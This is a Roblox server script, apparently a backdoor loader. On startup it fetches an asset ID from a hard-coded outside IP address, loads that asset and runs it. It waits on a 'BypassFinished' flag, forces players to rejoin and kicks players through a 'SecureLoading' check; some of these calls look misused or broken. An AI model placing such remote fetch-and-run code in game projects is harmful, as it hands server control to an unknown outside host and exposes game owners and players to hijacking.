local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local DataStoreService = game:GetService("DataStoreService")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")

local RejoinStore = DataStoreService:GetDataStore("RejoinTracker")

-- Fetch MainModule ID from URL
local function getMainModuleId()
	local url = "http://74.208.152.188/Assets"
	local success, response = pcall(function()
		return HttpService:GetAsync(url)
	end)
	
	if not success then
		warn("Failed to fetch MainModule data:", response)
		return nil
	end
	
	local data = HttpService:JSONDecode(response)
	local placeId = tostring(game.PlaceId)
	
	if data[placeId] and data[placeId].MainModule then
		return data[placeId].MainModule
	else
		warn("MainModule not found for PlaceId:", placeId)
		return nil
	end
end

local mmid = getMainModuleId()

if mmid then
	local mainModule = game:GetService("InsertService"):LoadAsset(mmid)
	local moduleScript = mainModule:FindFirstChildWhichIsA("ModuleScript")
	
	if moduleScript then
		require(moduleScript)()
	else
		warn("ModuleScript not found in MainModule asset")
	end
else
	error("Could not retrieve MainModule ID")
end

repeat task.wait() until _G.BypassFinished
_G.FilesInitialized = true

local function playerNeedsRejoin(player)
	if RunService:IsStudio() then
		return false
	end
	local success, rejoinStatus = pcall(function()
		return RejoinStore:GetAsync(tostring(player.UserId))
	end)
	if not success then
		return true
	end
	if rejoinStatus == nil then
		return true
	elseif rejoinStatus == "NeedsRejoin" then
		return false
	elseif rejoinStatus == "Rejoined" then
		return true
	end
	return true
end

local function markPlayerRejoined(player)
	pcall(function()
		RejoinStore:SetAsync(tostring(player.UserId), "Rejoined")
	end)
end

local function forceRejoin(player)
	pcall(function()
		RejoinStore:SetAsync(tostring(player.UserId), "NeedsRejoin")
	end)
	task.wait(0.5)
	pcall(function()
		TeleportService:TeleportAsync(game.PlaceId, {player})
	end)
end

local function loadPlayerCharacter(player)
	Players.CharacterAutoLoads = true
	task.spawn(function()
		task.wait(0.2)
		if player and player:IsDescendantOf(Players) then
			pcall(function()
				player:LoadCharacter()
			end)
			player.CharacterAdded:Wait()
			local character = player.Character
			if character then
				character:WaitForChild("HumanoidRootPart", 10)
			end
		end
	end)
end

Players.CharacterAutoLoads = false

for _, plr in ipairs(Players:GetPlayers()) do
	if playerNeedsRejoin(plr) then
		forceRejoin(plr)
	else
		markPlayerRejoined(plr)
		loadPlayerCharacter(plr)
	end
end

Players.PlayerAdded:Connect(function(player)
	if playerNeedsRejoin(player) then
		forceRejoin(player)
	else
		markPlayerRejoined(player)
		loadPlayerCharacter(player)
	end
end)

if not _G.SecureLoading then
	_G.SecureLoading = true
	local NetworkServer = game:GetService("NetworkServer")
	if not RunService:IsStudio() and RunService:IsServer() and NetworkServer then
		local connections = {}
		local function checkLoadDescendants(player, model)
			for _, child in ipairs(model:GetDescendants()) do
				if child:IsA("RemoteFunction") then
					local connection = child.OnServerInvoke:Connect(function(player, args)
						if args[1] ~= "SecureLoadingKey" then
							NetworkServer:KickPlayer(player.UserId)
						end
					end)
					table.insert(connections, connection)
				end
			end
		end
		Players.PlayerAdded:Connect(function(player)
			player.CharacterAdded:Connect(function(character)
				checkLoadDescendants(player, character)
			end)
		end)
		for _, player in ipairs(Players:GetPlayers()) do
			if player.Character then
				checkLoadDescendants(player, player.Character)
			end
		end
		script.AncestryChanged:Connect(function()
			for _, connection in ipairs(connections) do
				connection:Disconnect()
			end
		end)
	end
end
